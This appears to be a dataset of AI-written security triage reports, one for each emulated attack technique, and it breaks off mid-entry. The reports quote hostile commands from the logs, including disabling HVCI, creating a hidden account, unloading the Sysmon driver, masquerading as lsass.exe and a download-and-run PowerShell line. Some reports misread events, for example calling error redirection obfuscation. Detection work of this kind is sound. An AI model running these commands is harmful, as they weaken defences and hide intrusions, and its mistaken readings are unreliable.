office-365-Disable-AntiPhishRule,"Upon analyzing the provided logs, here's a detailed assessment:

### Observations:

1. **PowerShell Activity:**
   - The PowerShell script is attempting to connect to Exchange Online using credentials with a blank password and executing several commands related to Anti-Phishing Rules (`Get-AntiPhishRule` and `Disable-AntiPhishRule`). This type of behavior can be indicative of attempts to bypass security safeguards which is highly suspicious.

2. **Execution Policy:**
   - The `powershell.exe` is executed with `-ExecutionPolicy Restricted`, which is generally a more secure setting. However, the suspicious aspect is the script contents, rather than the execution policy itself.

3. **Processes Running with High Integrity Level:**
   - Multiple processes such as `hostname.exe`, `whoami.exe`, and PowerShell itself run at a high integrity level by the user `admin_test`, as evidenced by the Sysmon logs. Generally, these processes are benign, but their appearance in logs with suspicious PowerShell activity can indicate further investigation is needed into these activities.

4. **Process Creation:**
   - Creation of processes like `SecureBootEncodeUEFI.exe` and its child process `conhost.exe` by `NT AUTHORITY\SYSTEM` is not inherently suspicious but should be examined to ensure they are aligned with expected system activity.

5. **Windows Event Logs from Sysmon:**
   - Sysmon events do not record any immediate red flags like modifications to critical system files, persistence mechanisms, or clear malware indicators.

6. **Application and System Logs:**
   - Regular operations such as a Software Protection Platform Service start and Windows Updates are recorded, indicating regular system activity. These logs do not immediately suggest any compromise or malicious activity.

### Conclusion:

The key factor of concern here is the PowerShell script, attempting to connect to Exchange and disable anti-phishing rules with blank passwords, which is highly irregular and indicative of potentially malicious intent. This aligns more with efforts to compromise or hijack email systems by disabling security features.

### Recommended Resolution:

- **SUSPICIOUS**: The event logs indicate actions that do not look right, mainly due to the commands executed in PowerShell that require further investigation into the user credentials used, the intent behind these actions, and whether they correspond with legitimate administrative tasks. Immediate attention and further investigation are required to confirm whether this activity is authorized or indicative of a potential security breach."
Disable Hypervisor-Enforced Code Integrity (HVCI),"Upon reviewing the Windows event logs, specifically the Sysmon and PowerShell logs, several notable patterns emerge indicating potentially malicious activity:

1. **Command Execution via PowerShell**: 
   - There's a consistent pattern of commands executed through PowerShell, targeting the registry keys associated with `DeviceGuard` and `HypervisorEnforcedCodeIntegrity`. The commands involve querying these settings and potentially modifying them (e.g., `reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" /t REG_DWORD /d 0 /f`).
   - These registry modifications, particularly disabling security features such as Hypervisor Enforced Code Integrity, are significant as they suggest an attempt to weaken the system's security posture possibly for privilege escalation or to circumvent other security mechanisms.

2. **Command-Line Obfuscation**:
   - There's an explicit use of obfuscation techniques in command-line arguments, such as using `2>&1` to suppress error outputs and piping (`|`) with `findstr` to filter results. These are commonly employed in malicious scripts to fine-tune the output and suppress any potential warning messages.

3. **High Integrity Level Operations**:
   - The logs show that these operations are executed with a high integrity level, indicating administrative privilege is leveraged, which might have been obtained illicitly, further implying an initial compromise or privilege escalation.

4. **Suspicious Process Chains**:
   - The execution of `cmd.exe` and `reg.exe` under the guidance of `powershell.exe` can signal scripted operations likely scheduled or executed by a script or malware which automates such tasks, often seen in suspicious behaviors.

5. **Repeated Registry Queries**:
   - Repeated registry queries often aim to ascertain the state of security configurations. In conjunction with the `reg add` operations, this reflects a structured attack strategy to assess and then modify the system configuration.

**Assessment**:
- The above activities suggest intentional actions to modify system security settings, typically associated with malicious intent, rather than routine administrative tasks.

**Threats or Risks Identified**:
- Compromise of system security settings could allow further malicious operations, including installation and execution of unauthorized software, data exfiltration, or additional lateral movement across the network.

**Guidance**:
- **Immediate Response**: It is critical to suspend this activity by isolating the machine from the network to prevent further changes or exfiltration.
- **Further Investigation**: Conduct a thorough forensic analysis to ascertain how administrative privileges were obtained and the extent of modifications to security settings. Analyze network traffic logs contemporaneous with these events for any external command and control indications.
- **Remedial Action**: Re-establish secure configurations for registry keys related to `DeviceGuard` and other security settings. Ensure all patches are up-to-date and unauthorized users are removed from privileged groups.
  
**Resolution**: MALICIOUS

The logs contain definitive signs of malicious activity, given the structured attempts to alter critical security configurations and the use of obfuscation techniques that are not typical of benign administrative actions."
Create Hidden User in Registry,"Upon reviewing the provided Windows event logs, there are clear indications of malicious activities that warrant immediate concern. Let's delve into the findings:

1. **Suspicious User Account Activity**:
   - An event (Sysmon Event ID 1) indicates a cmd.exe process executed with a specific command to add a new user and manipulate registry entries:
     ```plaintext
     ""CommandLine"":""\""cmd.exe\"" /c NET USER fileOperator$ At0micRedTeam! /ADD /expires:never  & REG ADD \""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\"" /v fileOperator$ /t REG_DWORD /d 0""
     ```
   - Corresponding security audit logs (Event IDs 4720, 4722) confirm the creation and enabling of a new user account `fileOperator$`, which resembles tactics used in privilege escalation attacks.

2. **Potential Privilege Escalation**:
   - The use of net.exe and reg.exe to manipulate user accounts and registry settings can be indicative of privilege escalation or persistence mechanisms:
     - `net.exe` was used to add the user account: `NET  USER fileOperator$ At0micRedTeam! /ADD /expires:never`.
     - `reg.exe` was executed to manipulate the Windows registry to hide the newly created account.

3. **Indicators of Remote Access Tools**:
   - Sysmon logs show the execution of benign Windows binaries like `whoami.exe` and `hostname.exe`, which, although safe in isolation, can be used by attackers post-compromise to gather system information following successful access.

4. **Anomalies and Contextual Clues**:
   - The consistent use of the `admin_test` account across suspicious activities suggests this account might be compromised. It used high-integrity processes and carried out potentially unauthorized user and registry modifications.
   - Time discrepancies are observed in the system logs indicating potential time stamp manipulation, which is sometimes a tactic to obscure activities or evade detection.

5. **Unusual Service Behavior**:
   - The presence of edgeupdate service activities is normal, but it's crucial to validate that such services are not being hijacked for persistence.

Based on these findings, these activities unequivocally indicate compromise and potential malicious intent. I recommend the following actions:

- **Immediate Response**: Isolate the affected system, especially Server002, from the network to prevent further unauthorized access or lateral movement.
- **User Account Action**: Disable the `fileOperator$` account and reset credentials for `admin_test`.
- **Comprehensive Review**: Perform a thorough inspection of system configurations, scheduled tasks, and installed applications to identify potential backdoors or persistence mechanisms.
- **Threat Hunting and Analysis**: Conduct a deeper investigation into potential lateral movement or data exfiltration attempts on the network.
- **Incident Reporting and Review**: Document the findings and implement a review of similar systems for indicators of compromise.

**Resolution**: MALICIOUS - The logs contain clear signs of account compromise and unauthorized system modifications indicative of malicious activity."
Disable Windows Registry Tool,"Upon reviewing the provided Windows event logs across various logs like Security, Application, System, and Sysmon, I have identified both normal and potentially hazardous activities. Here's a breakdown of the analysis:

### Security Log
No clear signs of malicious activities are observed here. The change in system time events (Event ID: 4616) from `svchost.exe` executed by `LOCAL SERVICE` is logged, which is a commonplace activity for time synchronization services. This alone does not indicate any suspicious behavior.

### Application Log
Stops of services like `edgeupdate` are recounted, but in isolation, this does not contain malicious indications, as service restarts can be regular in some systems.

### System Log
The logs primarily demonstrate kernel and time service operations. Changes to the system's time zone and references to `time.windows.com` NTP server highlight standard configurations related to timekeeping, not indicative of compromise.

### Sysmon Log
Several suspicious activities are detected:
1. **Command Execution**: Use of `cmd.exe` to add registry keys (`reg add HKEY_CURRENT_USER\...DisableRegistryTools /t REG_DWORD /d 1 /f`). This is concerning as it disables registry tools that diminish security features, prohibiting registry access and modifications—a known tactic for malware persistence.
2. **Use of System Utilities**: Frequent invocation of `wevtutil.exe` pertaining to Event Log management by the same user (ADMIN_TEST), suggests potential log tampering or information gathering for malicious standing.
3. **Administrative User Pattern**: Excessive spawning of `conhost.exe` and other command-related activities suggestive of console-based commands or scripts.
4. **Unauthorized Information Gathering**: Execution of `whoami.exe` might indicate account reconnaissance. Given its correlation with other utilities, this raises suspicion regarding intent.

### Assessment
Combining observations, the Sysmon log primarily flags potentially destructive actions. The activity to disable registry tools strongly implies malicious behavior, and along with the log management commands, they denote suspicious undertakings likely contrived to mislead traditionally IT-red teaming exercises.

### Conclusion
- **Resolution**: **MALICIOUS**

### Guidance
Immediate actions should include:
1. **Containment**: Quarantine the affected system to prevent further harm and lateral spread.
2. **Detailed Forensics**: Conduct thorough forensics to trace changes to system and user changes in SCADA, especially those by `admin_test`.
3. **Review and Clean**: Examine modifications in the registry, and scrutinize system and user-creations particularly around time zones.
4. **Monitoring and Alerts**: Heighten monitoring configurations for indicators of similar behaviors across connected assets.
5. **User Credentials**: Rotate passwords and scrutinize all privileged accounts for unauthorized activities or escalations.
6. **Security Policy Review**: Add policy to disable any creation of critical registry changes, emphasizing DisableRegistryTools as particularly sensitive.

This denotes a significant security incident and mandates a focused remediation and investigation to forestall recurrence."
System File Copied to Unusual Location,"Upon analyzing the provided Windows event logs, some activities stand out as potentially suspicious and should be investigated further:

1. **Credential Access Attempts**: Multiple `EventID 5379` logs from the Security log indicate failed credential access attempts targeting a Microsoft account (`MicrosoftAccount:user=02txoixylodcstop`). This is notable because repeated failed access attempts could suggest unauthorized attempts to access accounts.

2. **PowerShell Execution**: The PowerShell log entries show a script execution that copies `cmd.exe` to a new location (`$env:allusersprofile`) and starts a new process. The behavior of copying `cmd.exe` and executing it elsewhere is often seen in obfuscation techniques or attempts to evade detection. This is suspicious, particularly when combined with the use of PowerShell, which is a common tool for attackers due to its powerful scripting capabilities.

3. **Process Execution with High Integrity Level**: The `Sysmon` log shows the execution of processes like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and others with high integrity levels under the `admin_test` user. While these processes are legitimate, their sequence, particularly with the execution of PowerShell in between, and the creation of a new `cmd.exe` from PowerShell can indicate malicious intent if the user `admin_test` does not normally perform such actions.

4. **Anomalous PowerShell Command**: The `CommandLine` from the PowerShell log contains operations like `copy-item` and `start-process`, which is not typically found in benign scripts executed by regular users. This might suggest an attempt to use PowerShell to execute commands or scripts on the system without directly using a `cmd` window.

5. **System Update and Malware Protection Activities**: The updates related to Microsoft Defender and Edge suggest legitimate system activities. However, the timing overlap with the suspicious PowerShell activity may warrant further investigation to rule out any manipulation or exploitation coinciding with system updates.

Given these observations, my assessment would classify this case as **SUSPICIOUS** because there are activities that need further investigation. These activities don't definitively confirm malicious intent; however, they raise enough questions to recommend a closer review. 

### Recommendations:
- **Review User Activity**: Verify whether the user `SERVER002\admin_test` should be executing PowerShell scripts that move and start system executables. Confirm this with authorized system usage policies and typical user behavior.
- **Credential Audits**: Investigate the failed credential access attempts. Identify if these are from internal or external sources, and ensure there are no unauthorized attempts to access user accounts.
- **Threat Hunt for Similar Patterns**: Conduct a broader search across other systems for similar PowerShell and Sysmon events that may indicate widespread tactics consistent with known attack methodologies.
- **Review System Logs**: Look for any signs of privilege escalation or lateral movement attempts following the suspicious PowerShell activities.

It is crucial to ensure that these actions were authorized and that no security policy violations occurred. Further monitoring and alert configurations may be required to detect such activities promptly in the future."
attrib - hide file,"**Detailed Analysis:**

1. **Time Synchronization Events:**
   - In the Security and System logs, multiple `EventID 4616` entries indicate changes to the system time. These events show alterations to the system's clock by the `NT AUTHORITY\LOCAL SERVICE` account via the `svchost.exe` process. This activity is fairly common and typically benign as systems occasionally sync time with NTP servers to ensure accurate timekeeping.

2. **Process Execution Observations:**
   - The Sysmon logs record multiple processes being executed. Notably, there are several executions of standard Windows utilities such as `whoami.exe`, `wevtutil.exe`, `cmd.exe`, and `attrib.exe` by the user `SERVER002\admin_test` with high integrity level. These tools are legitimate Windows processes but can be used in various administrative or malicious scenarios.

3. **`cmd.exe` Operations:**
   - A noteworthy command observed involves `cmd.exe` creating a hidden directory and files in the user's temp path, followed by the usage of `attrib.exe` to hide files. This operation could be legitimate if done by an administrator for organizational or script-based purposes. However, this is also a known technique for malicious actors attempting to conceal files.

4. **Microsoft Edge Update Executions:**
   - Processes related to `MicrosoftEdgeUpdate.exe` were repeatedly executed, which are legitimate update processes. However, seeing these entries from temp directories, especially `C:\Program Files (x86)\Microsoft\Temp\`, warrants attention as malicious actors sometimes disguise malware this way.

5. **General Observations:**
   - The system appears to have several instances where tools are executed in a batch, such as the user `admin_test` running `whoami.exe`, `wevtutil.exe`, `cmd.exe`, and subsequently hiding files. The presence of script-like process executions suggests automation, which could be part of a scheduled task or script by an admin user.

**Assessment:**
- The execution of system utilities and usage of PowerShell in unusual or repetitive manners suggest potential suspicious behavior, possibly indicating either unauthorized activity or legitimate process automation by an administrator.
- The file hiding via `cmd.exe` and `attrib.exe` is slightly suspicious, given normal user operations typically do not require such obfuscation techniques.
- While there's no direct evidence of malicious binaries or known malicious behavior, the contexts of process executions and actions performed collectively raise some concerns.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct further investigation into the origin and purpose of the automated or script-like operations observed under the `admin_test` account. Verify if these are part of an expected administrative setup.
- Monitor and review the creation of hidden directories and files in user temp directories for possible exfiltration or hidden payloads, ensuring these actions were authorized.
- Check for scheduled tasks, startup items, or scripts associated with these events to clarify intent and potential authorization.
- Enhance monitoring of similar behaviors and ensure the system's protection mechanisms are up-to-date to prevent potential exploitation."
Store file in Alternate Data Stream (ADS),"**Detailed Analysis of Log Entries:**

1. **Event Logs Review:**
   - The logs reviewed are generated by Sysmon, Windows System, Application, Security, and Windows PowerShell event log channels.
   
2. **Sysmon Logs Observation:**
   - Frequent execution of Windows utilities like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, `hostname.exe`, and `powershell.exe` all executed by `SERVER002\\admin_test`.
   - Among them, a notable event is the invocation of `powershell.exe` with a commandline to create a non-standard path `C:\Users\Public\Libraries\yanki` and redirect the output of `cmd.exe` into an alternate data stream (ADS) `desktop.ini:desktop.ini`, indicating potential obfuscation or data hiding tactics.
   - This is potentially indicative of suspicious activity as obfuscation or redirecting the execution output can be a technique used to hide malicious activities.

3. **System Logs Examination:**
   - The time change witnessed in the Kernel-General logs suggests some manipulation with the system time which can be used to evade detection mechanisms or manipulate event timestamps.

4. **Application Logs Observations:**
   - Several `edgeupdate` service stops. This needs corroborating with application activities for expected auto-update behavior but seems benign initially.

5. **Security Log Review:**
   - The alteration in system time captured in the security log matches with observations in the system event log, confirming manipulation.
   
6. **Windows PowerShell Logs Scrutiny:**
   - PowerShell logs confirm the execution of script via `powershell.exe`, reflecting modular tasks typically suspect when related to unexpected data writing or environmental modifications like those seen.

**Assessment of Situation:**

- The logs include several instances of common utility executions under the same user, paired with PowerShell activities showing redirecting command outputs. This behavior, in combination with unconventional directory and ADS usage, raises a red flag for post-exploitation activity.
- The timestamp manipulation observed could suggest an attempt to hide or misreport the timing of events within the logs making it harder to accurately trace user actions, a known tactic to evade forensics.

**Threats/Risks Identified:**

- **Potential Data Exfiltration or Evasion**: The use of PowerShell in combination with cmd and potential ADS use signifies attempts to bypass standard monitoring and security solutions.
- **Time Stomping**: The system clock adjustments present risks manipulating timeline integrity, thus affecting incident chronology understanding - utilized often to obscure tracks.

**Guidance on How to Proceed:**

- Conduct detailed examination of the system's change logs and compare against known user change times.
- Isolate the compromised account (`SERVER002\\admin_test`), check for unauthorized access, and consider resetting access privileges.
- Analyze network traffic and potentially used endpoints for data exchange attempts.
- Vocally challenge user validation and perform immediate scrutinization of their activities during the suspicious timeline.

**Final Resolution:**

- **SUSPICIOUS**: The cumulative evidence of command manipulation, obfuscation signs, and time tampering collectively raise strong suspicion for malicious intent or reconnaissance activity that needs further investigation to confirm intentions and scope of activities."
Lolbin Gpscript logon option,"Upon analyzing the provided Windows event logs, here's a detailed breakdown of the entries and potential indicators of suspicious activity:

### Security Log Analysis
1. **Event ID 4616 (Time Change)**
   - Repeated time changes recorded from the same process (`svchost.exe`) and user (`LOCAL SERVICE`, `NT AUTHORITY`).
   - Frequent and closely-timed clock adjustments could indicate an attempt to manipulate time-based security logs or evade detection, though this in itself is not definitive proof of malicious intent.

### Sysmon Log Analysis
1. **Event ID 5 (Process Creation)**
   - Numerous instances of legitimate Windows processes (`wevtutil.exe`, `conhost.exe`, `cmd.exe`, `sppsvc.exe`, etc.) were observed.
   - Execution of `cmd.exe` with a `/c Gpscript /logon` command line, which is used for executing scripts at logon. This alone isn't suspicious but might warrant exploration in the context of the analyzed behavior.

2. **Event ID 1 (Process Termination)**
   - Various legitimate Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86.exe`) run under `NT AUTHORITY\SYSTEM`.
   - Frequent updates from Microsoft Edge Update processes suggest routine maintenance and updates for the application, which are regular and expected activities.

3. **Other Logs**
   - Activities of processes related to hostname resolution and session information like `HOSTNAME.EXE` and `WHOAMI.EXE` show normal activity as typical administrative commands.

### System Log Analysis
- **Kernel-General Event ID 1**: Logs indicate time manipulation similar to the security logs discussed, manifested as routine with `svchost.exe`.

### Application Log Analysis
- Relevant to typical service operations and confirmation of Microsoft Edge Update processes stopping and starting without further evidence of tampering or misuse.

### Conclusion and Resolution:

- **Benign Activities**: The entries for Microsoft Edge Update, system utilities checking hostname, and user information via `WHOAMI.EXE`, and the execution of `conhost.exe` as console interfaces indicate regular operational behaviors.
 
- **Suspicious Elements**: Multiple close time adjustments and command executions related to logon scripts should be noted and require a broader context examination to rule out misuse.

### Final Assessment:
- **Resolution**: **SUSPICIOUS**
  - While there's no definitive, clear-cut indicator of malicious activity, the time adjustments and certain command executions merit additional scrutiny to ensure no underlying malicious behavior is occurring without detection. Investigations should verify the legitimacy of the time changes and scripts executed at logon.
  
- **Recommendation**: Conduct further investigation into the timing changes for potential time manipulation threats and verify the legitimacy of executed scripts and commands by correlating with additional logs and monitoring system behavior over a period."
Unload Sysmon Filter Driver,"Upon reviewing the provided Windows event logs, specifically focusing on the Sysmon and Security logs, I have noted certain activities that merit further analysis. Here's a detailed breakdown:

### Analysis of Logs:

1. **Sysmon Logs:**
   - **Event ID 1 (Process Creation):**
     - Multiple invocations of tools like `fltMC.exe`, `wevtutil.exe`, and `cmd.exe` under the user account `SERVER002\\admin_test`.
     - For instance, `cmd.exe` is used with command line `cmd.exe /c fltmc.exe unload SysmonDrv`. This suggests that there might be an attempt to manipulate or unload Sysmon, which could potentially be a way to evade detection.
     - `fltMC.exe` is invoked to manage filter drivers, which is not typical for regular system operations and indicates an attempt to modify system components or bypass certain filters.

2. **System Logs:**
   - Time adjustments were observed, with time changes logged by the Kernel-General and Time-Service, but no direct correlation indicating compromise from these actions alone.

3. **Security Logs:**
   - Event ID 4616 (System Time Change): Noted changes, which could be used to manipulate timestamps on files or logs to cover tracks, though it often happens legitimately.

### Suspicious Findings:
- The use of `fltMC.exe` and `wevtutil.exe` by a non-system privileged user, particularly `admin_test`, can be suspicious as these are powerful tools that require administrative privileges.
- `cmd.exe` unloading `SysmonDrv` is indicative of potential tampering with security monitoring tools, which is a common tactic in malicious activities for attempting to obfuscate or manipulate logging.
- The use of `powershell.exe` with conditional logic checking for Sysmon presence suggests script-based attempts at evading detection or operational preparatory actions.

### Conclusion:

Given the above observations, especially the activities surrounding unloading of Sysmon drivers and execution of powerful system utilities by a seemingly administrative user account, the activities captured in the logs could be suspicious.

### Recommended Resolution: **SUSPICIOUS**

While there is no definitive malicious activity proven, the activities are highly unusual and warrant further investigation:
- **Immediate Steps:**
  - Verify the legitimacy of the user `admin_test` and their intended activities.
  - Check for any recent installations or changes to system policies which might explain the use of these commands.
  - Network monitoring for any unusual or unauthorized data exfiltration or abnormal access patterns.

- **Further Analysis:**
  - Examine the PowerShell scripts involved to ensure they are authorized and not indicative of further malicious scripting.
  - Correlate this Sysmon data with intrusion detection system alerts or antivirus logs to determine if this activity aligns with sophisticated attack vectors."
Service Registry Permissions Weakness,"### Analysis

Upon reviewing the provided logs from the Windows machine, the following points stand out:

#### Windows PowerShell Logs:
- **PowerShell Commands**: The execution of `get-acl` on registry paths concerning `HKLM\SYSTEM\CurrentControlSet\Services\*` and `HKLM\SYSTEM\CurrentControlSet\Services\weakservicename` using PowerShell is noteworthy. This command retrieves permissions, which could be benign for auditing purposes, but is also known to be used for identifying weak service permissions during post-exploitation enumeration by attackers.

#### Application Logs:
- **Microsoft Edge Update**: A series of events involving the Microsoft Edge Update service is evident, with processes indicating updates or installations of Microsoft Edge. The behavior in the application logs seems typical for an update process.

#### System Logs:
- **Time Synchronization**: A sequence of Windows Time Service events shows synchronization with the time source `time.windows.com`. This is common behavior and does not stand out as suspicious.

#### Sysmon Logs:
- **Whoami and Wevtutil Executions**: The use of `whoami`, which displays the current user information, is not inherently suspicious but can indicate enumeration activities. 
- **Wevtutil Usage**: `wevtutil.exe` is a command-line utility for managing event logs. While it is often used by administrators, it can also be employed by attackers to clear logs or tamper with them.
- **PowerShell Execution**: The PowerShell process aligns with the commands shown in the PowerShell logs and their execution context. The command execution resembles a script execution for permissions assessment.
- **Microsoft Edge Update**: Activity around Edge Update is corroborated by corresponding Sysmon events. The logs indicate that Edge update activities are frequent, which could relate to the update cycle, and appear expected for system maintenance.

### Assessment
- **PowerShell Activity**: The specific PowerShell commands executed suggest a focus on system services, which can indicate enumeration activity. This is not definitively malicious without knowing the intent, as it may align with legitimate administrative tasks.
- **Whoami & Wevtutil**: The occurrence of `whoami` and `wevtutil` indicates potential reconnaissance and log manipulation activities. However, without more context, such as remote connections or privilege changes, these alone do not confirm malicious intent.

### Resolution
Given the data in the logs, the action taken, and typical system behavior:
- **Resolution**: **SUSPICIOUS**

The activities noted, particularly the use of commands traditionally used for reconnaissance (`get-acl`, `whoami`, `wevtutil`), warrant further investigation to determine intent and context. While there is no incontrovertible evidence of compromise, these activities are common in the reconnaissance phase of an attack. Further examination should include:
- Reviewing user activity logs around the timestamps of these actions.
- Checking for any network connections or authentications that coincide with these events.
- Validating if these actions align with scheduled tasks or known administrative operations.

A deeper forensic analysis could confirm whether this is legitimate behavior or if it requires an escalation to an incident response."
Clear Event Logs via VBA,"Upon analyzing the provided event logs, several nuances indicate potentially malicious activity:

1. **Unusual PowerShell Activity:**
   - Multiple events from the Sysmon log show execution of `powershell.exe` with a suspicious command line that includes downloading and executing a script from a GitHub URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`). This script is indicative of potentially malicious activity as it suggests downloading and executing a remote script.
   - The PowerShell logs corroborate this by capturing the PowerShell command execution related to the suspicious script.

2. **Processes Launched Under 'admin_test':**
   - The Sysmon logs show instance executions of `powershell.exe`, `wevtutil.exe`, and `whoami.exe` under the user `SERVER002\admin_test`. The combination of PowerShell usage with tools like `wevtutil.exe` (a Windows command-line utility used for managing event logs) aligns with potential tactics for evasion and data manipulation.

3. **Security Privileges:**
   - Event ID 4672 indicates that privileges were assigned to the SYSTEM account. While it's normal for SYSTEM processes to hold high privileges, given the context, it may signal privilege escalation attempts or misuse.

4. **Suspicious Commands:**
   - The PowerShell command includes functions related to macros and potentially clearing logs. This is suspicious as it might be used to obfuscate or remove evidence of nefarious activities.

**Conclusion:**
Based on the analysis, the logs contain evidence of potentially malicious behavior, notably attempts to execute potentially harmful PowerShell scripts and use of administrative-like commands by a non-standard administrative user (`admin_test`). These indicators suggest that there is a high risk of compromise.

**Resolution: MALICIOUS**
To proceed, it is recommended to:
- Isolate the affected system to prevent further potential spread or damage.
- Conduct a thorough forensic analysis to understand the full scope and impact.
- Determine if there are any lateral movements or further persistence mechanisms deployed.
- Consider a review and tightening of access control and network security policies."
Masquerading as Windows LSASS process,"In analyzing the provided Windows event logs, let's break down significant findings across different log sources:

### Security Log Analysis:

1. **Credential Requests (EventID 5379):** Multiple failed credential requests are noticeable throughout the logs. These attempts to retrieve credentials for `MicrosoftAccount:user=02txoixylodcstop` from the WORKGROUP domain fail with a return code `3221226021` which translates to ""The account does not have permission to access the target resource."" The repetition of these failures could indicate an automated attempt to access or brute-force account credentials associated with Microsoft services.

2. **Logon Events (EventID 4624):** Several logon events with logon type `5` are observed. This logon type is usually reserved for service logons, indicating these accounts were being used in the context of system services. Logons with elevated privileges such as `SeDebugPrivilege` and similar privileged lists were granted (EventID 4672).

3. **Account Enumeration (EventID 4798):** The `CompatTelRunner.exe` process is observed querying user accounts, including well-known accounts like Administrator, Guest, and other user accounts. This might be typical of some telemetry or inventorying processes, but in conjunction with other suspicious activities, it warrants further scrutiny. 

4. **Privilege Assignments (EventID 4672):** Privileged accounts have been assigned ample administrative privileges, including `SeDebugPrivilege`, which could allow process manipulation and heightened control over the system.

### Application Log Analysis:

- **Windows Defender:** No unusual protective notifications appear active with Windows Defender set in a typical operational mode (`SECURITY_PRODUCT_STATE_ON`).

### System Log Analysis:

- **Windows Update Activity (EventID 44, 43, 19):** Routine updates for Microsoft services and components are logged, which generally do not indicate security concerns on their own.

### Powershell Log Analysis:

- Specific commands executed in PowerShell like file reading in conjunction with specific criteria (e.g., scanning for specific strings in files) could suggest reconnaissance activities though no outright malicious command was detected in the provided snippets.

### Sysmon Log Analysis:

1. **Process Executions (EventID 1):** Numerous invocations of common Windows system processes (`cmd.exe`, `sc.exe`, `CompatTelRunner.exe`) and tasks related to Microsoft Edge updates have been logged. Notably, one command uses cmd.exe to copy and execute a file named `lsass.exe`, which is a red alert as `lsass.exe` is a system file typically targeted in attacks aiming at dumping credentials.

2. **Divergence in Command Execution:** Command lines such as `""cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe & %SystemRoot%\Temp\lsass.exe /B""` exhibit suspicious attempts to copy and execute processes in temporary directories, under the guise of legitimate executables—potential indicators of process impersonation or masquerading attempts.

### Conclusion and Recommendations:

There are several indicators within these logs that suggest potentially malicious activities, especially surrounding the numerous failed credential access attempts, process execution anomalies, and potentially unauthorized account enumeration activities. The execution of commands attempting to run renamed `cmd.exe` instances as `lsass.exe`, a known technique for credential harvesting, is a particular warning signal.

**Resolution: MALICIOUS**

**Guidance:**

- **Immediate Threat Assessment:** Further investigation is required to determine if systems have been compromised and the entire scope of potential data exposure.
- **Incident Response:** Isolation of the impacted system from the network to prevent lateral movement or further data exfiltration.
- **Full Forensic Analysis:** Conduct a full forensic analysis on impacted systems, especially focusing on processes interacting with system-critical files and services.
- **Account Audit:** Review account login attempts and privileges, particularly for unusual timeframes or anomalies.
- **Patch and Update:** Ensure all systems are up-to-date with security patches, especially if they are related to services and components logged.
- **Strengthen Monitoring:** Enhance real-time monitoring of logs for similar patterns or unusual behaviors and improve endpoints' security configurations."
Set Custom AddToHistoryHandler to Avoid History File Logging,"After reviewing the provided Windows event logs, here's a detailed analysis of the logged events:

### Sysmon Logs:
1. **Whoami.exe Execution**: Multiple instances of `C:\Windows\System32\whoami.exe` executed (Event Record IDs: 17948, 17974). This utility is used to query user information. Frequent or unexpected usage of this command may indicate reconnaissance activities. However, the context here doesn't suggest immediate malicious activity as both parent processes are legitimate.

2. **Conhost.exe and Wevtutil.exe Processes**: There are several entries for `conhost.exe` and `wevtutil.exe`. `Conhost.exe` is typically benign and a part of console processes. `Wevtutil.exe` is used for managing event logs and subscriptions. The normal use of these can be for either legitimate admin tasks or potentially clearing logs if misused maliciously. However, without context, this seems to be part of regular operations.
   
3. **Powershell Execution**:
   - PowerShell was executed with custom options (Event Record ID: 17978). The command line used is `powershell.exe & {Set-PSReadLineOption -AddToHistoryHandler { return $false }}`. This specific option is potentially suspicious as it prevents certain PowerShell commands from being logged in the commands history, often used to obfuscate actions but by itself does not confirm malicious intent.

4. **Microsoft Edge Update**: A significant number of entries are related to `MicrosoftEdgeUpdate.exe` and its components. These updates typically run under `NT AUTHORITY\SYSTEM` and appear to be regular update processes without clear indicators of tampering.

### Application Logs:
- Entries related to the Software Protection Platform Service and Edge update processes are standard and do not suggest any anomalous activity.

### Windows PowerShell Logs:
- Reiterate PowerShell's use with a command to adjust PSReadLine options. This could be a typical admin task, but when combined with a broader usage pattern could also suggest attempts to hide malicious activities.

### Assessment:
- The logs contain indicators that suggest typical administrative activities such as the execution of `whoami`, `wevtutil`, `conhost`, along with Microsoft Edge updates. 
- The specific use of PowerShell with options designed not to add entries to the history is a red flag but requires additional context to determine true intent.

### Conclusion:
The assessment of the entries provided leads to a conclusion of potential concern regarding:
- PowerShell usage with options suggesting intentions to avoid command history logging.

Given the lack of additional contextual anomalies such as attempted privilege escalations or clear intrusion activities, the final resolution should be classified as:

**SUSPICIOUS**

### Recommendation:
1. **Further Investigation**: 
   - Review user actions and logs beyond those provided for broader context, specifically around PowerShell use.
   - Correlate activities with known administrative tasks or scheduled scripts.
   
2. **Monitoring**: 
   - Implement stricter monitoring of PowerShell activity and utilization patterns.
   - Audit other related logs for corroborative evidence of unauthorized access or tampering.

3. **User Verification**: 
   - Confirm whether the `admin_test` user was expected to perform these actions.
   
This classification allows actions to be undertaken to ensure any potentially malicious activity is identified and mitigated timely."
Disable Windows LogOff Button,"Upon analyzing the provided Windows event logs, I've identified several potential concerns:

### Notable Observations:
1. **Frequent Execution of System Utilities:**
    - There are repeated executions of `wevtutil.exe` and `conhost.exe` under the `SERVER002\admin_test` account. While `conhost.exe` is a legitimate process related to console windows, the frequent execution of `wevtutil.exe` may imply log manipulation or extraction, which is not typical for regular administrative tasks.
  
2. **Registry Modification via Command Prompt:**
    - The execution of `cmd.exe` with command-line arguments altering the registry (`NoLogOff` and `StartMenuLogOff`) is suspicious as these configurations could potentially indicate an effort to hinder user logoff or manipulate user permissions. This was executed under the `SERVER002\admin_test` account with high integrity level, which indicates elevated privileges.

3. **Unexpected Command Tool Usage:**
    - The execution of `whoami.exe`, `HOSTNAME.EXE`, and `cmd.exe` with specific command-line instructions suggest inquiry into the logged-on user context, possibly by an attacker checking their environment.

4. **Parent Process Origin:**
    - Various processes like `wsmprovhost.exe` spawn child processes which include command execution utilities (`cmd.exe`) to modify registry settings. This is irregular behavior and could suggest tasks being automated via scripting or exploit payloads.

5. **Microsoft Edge Update Processes:**
    - The logs show processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe`) executing with `NT AUTHORITY\SYSTEM` privileges. These are legitimate processes but need to be reviewed to ensure they align with expected system update schedules and procedures.

### Assessment:
